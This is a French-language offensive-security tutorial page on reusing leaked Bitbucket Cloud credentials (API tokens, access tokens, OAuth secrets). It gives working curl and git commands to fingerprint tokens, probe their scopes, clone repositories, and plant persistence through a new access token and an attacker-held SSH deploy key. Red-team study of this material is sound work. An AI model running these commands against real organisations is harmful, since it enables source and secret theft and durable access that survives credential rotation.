---
title: "Abus des jetons et mots de passe d'application : réutiliser des identifiants Bitbucket Cloud divulgués"
order: 3
description: "Identifier et réutiliser des identifiants Bitbucket Cloud divulgués : jetons API à portée restreinte, jetons d'accès de dépôt/projet/espace de travail et consommateurs OAuth, lire leur identité et leur portée via l'API 2.0, cloner et pousser via git, et générer un accès durable. Explique pourquoi les mots de passe d'application retirés ne s'authentifient plus."
keywords:
  - jeton API Bitbucket
  - jeton d'accès
  - réutilisation d'identifiants
  - consommateur OAuth
  - mot de passe d'application
---

# Abus des jetons et mots de passe d'application

Bitbucket Cloud distribue plusieurs sortes d'identifiants, et un identifiant actif divulgué constitue souvent toute la mission. Ils diffèrent par la manière dont vous vous authentifiez et par l'identité et la portée qu'ils portent, de sorte que la première tâche avec toute chaîne capturée est de la classer, de lire son identité et ses permissions, puis d'agir dans leurs limites. Tout s'exécute contre `https://api.bitbucket.org/2.0` et `git` sur HTTPS.

Une classification importe avant toute autre chose : **les mots de passe d'application sont retirés**. Atlassian a désactivé les mots de passe d'application pour Bitbucket Cloud en 2026 et a basculé l'authentification vers des jetons API à portée restreinte, de sorte qu'une chaîne `ATBB...` récupérée dans une ancienne fuite ne s'authentifie plus et constitue un butin mort. Les identifiants actifs sont les jetons API Atlassian, les jetons d'accès Bitbucket et les jetons OAuth.

## Formes d'identifiants et empreinte

Classez selon le schéma d'authentification que l'API accepte.

| Identifiant | Schéma d'authentification | Identité | Statut |
| --- | --- | --- | --- |
| Jeton API Atlassian | Basic `email:api_token` | le compte Atlassian | actif |
| Jeton d'accès de dépôt / projet / espace de travail | Bearer | la ressource, pas d'utilisateur | actif |
| Jeton d'accès OAuth 2.0 | Bearer | l'utilisateur autorisant | actif |
| Mot de passe d'application | Basic `username:app_password` | l'utilisateur qui l'a créé | retiré, ne s'authentifie plus |

```bash
# Atlassian API token: Basic auth with the account email, identity via /2.0/user
curl -s -u "$BB_EMAIL:$BB_API_TOKEN" https://api.bitbucket.org/2.0/user | jq '{username,account_id,nickname}'

# Access token or OAuth token: Bearer auth
curl -s -H "Authorization: Bearer $BB_SECRET" https://api.bitbucket.org/2.0/user
```

Interprétez les réponses. Un `200` depuis l'appel `/2.0/user` en authentification Basic avec un e-mail comme nom d'utilisateur est un jeton API Atlassian actif. Un jeton Bearer qui renvoie `401` sur `/2.0/user` mais réussit sur un endpoint de dépôt est un **jeton d'accès de dépôt** : il n'a pas d'identité d'utilisateur et est lié à exactement un dépôt, donc cette liaison vous indique le rayon d'action sans deviner davantage. Un `username:secret` en Basic qui renvoie `401` est très probablement un mot de passe d'application retiré, pas un identifiant actif.

## Lire la portée que vous détenez

Un jeton ne porte que les portées que son créateur a accordées (compte, lecture/écriture/admin de dépôt, pipelines, webhooks, et ainsi de suite). Vous ne pouvez pas lister les portées directement, vous les sondez donc : chaque endpoint renvoie soit des données, soit un `403`, et le motif cartographie l'octroi.

```bash
AUTH=(-u "$BB_EMAIL:$BB_API_TOKEN")     # or: AUTH=(-H "Authorization: Bearer $BB_TOKEN")

# repository read
curl -s -o /dev/null -w '%{http_code} repos-read\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME?pagelen=1
# pipelines (can it trigger builds)
curl -s -o /dev/null -w '%{http_code} pipelines\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config
# admin (can it add tokens, keys, webhooks for persistence)
curl -s -o /dev/null -w '%{http_code} admin\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/deploy-keys
```

Un `200` sur `deploy-keys` signifie admin de dépôt, la position la plus forte : vous pouvez déposer une clé de déploiement SSH ou un nouveau jeton d'accès pour un accès durable. Un `200` sur `pipelines_config` plus l'écriture sur le dépôt constituent le relais vers [Abus des pipelines](pipelines-abuse.md).

## Agir dans les limites de l'octroi

Énumérez, puis agissez. Avec la lecture de dépôt, clonez tout ce que l'identifiant atteint et extrayez-en comme dans [Reconnaissance](reconnaissance.md).

```bash
# Clone with an Atlassian API token (Basic, account email as the username)
git clone https://$BB_EMAIL:$BB_API_TOKEN@bitbucket.org/ACME/payments-api.git

# Clone with an access token: the username is the literal x-token-auth
git clone https://x-token-auth:$BB_TOKEN@bitbucket.org/ACME/payments-api.git
```

Avec l'écriture sur le dépôt, vous pouvez pousser une branche, ce qui suffit à déclencher un pipeline et à atteindre ses secrets. Avec l'admin, générez une persistance qui survit à l'identifiant divulgué :

```bash
# Create a repository access token scoped to full repo + pipelines control (requires admin)
curl -s "${AUTH[@]}" -X PUT \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/access-tokens \
  -H 'Content-Type: application/json' \
  -d '{"name":"ci-maintenance","scopes":["repository:write","pipeline:write"]}' \
  | jq -r '.token'

# Or add an SSH deploy key you hold the private half of
curl -s "${AUTH[@]}" -X POST \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/deploy-keys \
  -H 'Content-Type: application/json' \
  -d '{"label":"backup","key":"ssh-ed25519 AAAA... attacker"}'
```

Le jeton d'accès renvoyé est un identifiant `ATCTT...` tout neuf lié au dépôt, un principal distinct qui continue de fonctionner même après le renouvellement de l'identifiant par lequel vous êtes entré.

## Variantes et suite

- **Portée des jetons API Atlassian** : un jeton API Atlassian authentifie le compte contre Bitbucket et d'autres produits Atlassian Cloud du même compte (Jira, Confluence), de sorte qu'un seul jeton élargit le pivot au-delà de la forge. Il atteint chaque espace de travail et dépôt que le compte peut atteindre, pas seulement un dépôt.
- **Un jeton d'accès est limité à une ressource** : un jeton d'accès de dépôt/projet/espace de travail est étroit par conception, lié à une seule ressource sans identité d'utilisateur, c'est donc un plus petit rayon d'action mais aussi plus discret.
- **Secrets de consommateurs OAuth** : une clé et un secret de consommateur OAuth divulgués vous permettent de générer des jetons à la demande via le flux client-credentials ou authorization-code, ce qui constitue une persistance au niveau de l'application plutôt qu'un jeton unique.
- **Suite** : un identifiant capable d'écrire achemine vers [Abus des pipelines](pipelines-abuse.md) pour l'exfiltration de secrets et les pivots cloud ; toute clé cloud trouvée par ce chemin achemine vers [AWS](../../cloud/aws/index.md).

## Notes

- Les mots de passe d'application sont retirés : un identifiant Basic `username:app_password` d'une ancienne fuite ne s'authentifie plus, alors ne gaspillez pas une mission à rejouer des chaînes `ATBB...`. Les jetons API Atlassian (Basic avec l'e-mail du compte) sont le remplacement en authentification Basic.
- Les jetons d'accès n'ont jamais d'identité d'utilisateur ; cessez d'essayer `/2.0/user` avec eux et sondez les endpoints de ressources pour trouver le dépôt, projet ou espace de travail unique auquel ils sont liés.
- Le sondage de portée avec `-o /dev/null -w '%{http_code}'` est en lecture seule et rapide ; cartographiez l'octroi avant toute action en écriture pour ne pas buter sur un `403` en pleine opération.
- Sur Bitbucket Data Center/Server, l'équivalent est un jeton d'accès HTTP présenté comme `Authorization: Bearer` contre `/rest/api/1.0/` ; le modèle de portées de Cloud 2.0 n'y existe pas.

## Outils

- **curl** / **jq** : classer les identifiants, sonder la portée et piloter l'API 2.0.
- **git** : cloner et pousser avec l'identifiant intégré dans l'URL.
- **TruffleHog** / **Gitleaks** : récupérer ces identifiants en premier lieu depuis le code et l'historique.

## Références

- [Bitbucket Cloud : repository, project, and workspace access tokens](https://support.atlassian.com/bitbucket-cloud/docs/using-access-tokens/)
- [Bitbucket Cloud : create an API token](https://support.atlassian.com/bitbucket-cloud/docs/create-an-api-token/)
- [Atlassian : manage API tokens for your account](https://support.atlassian.com/atlassian-account/docs/manage-api-tokens-for-your-atlassian-account/)
- [Bitbucket Cloud REST API : authentication](https://developer.atlassian.com/cloud/bitbucket/rest/intro/#authentication)
- [Bitbucket Cloud REST API : repository access tokens](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-repository-access-tokens/)
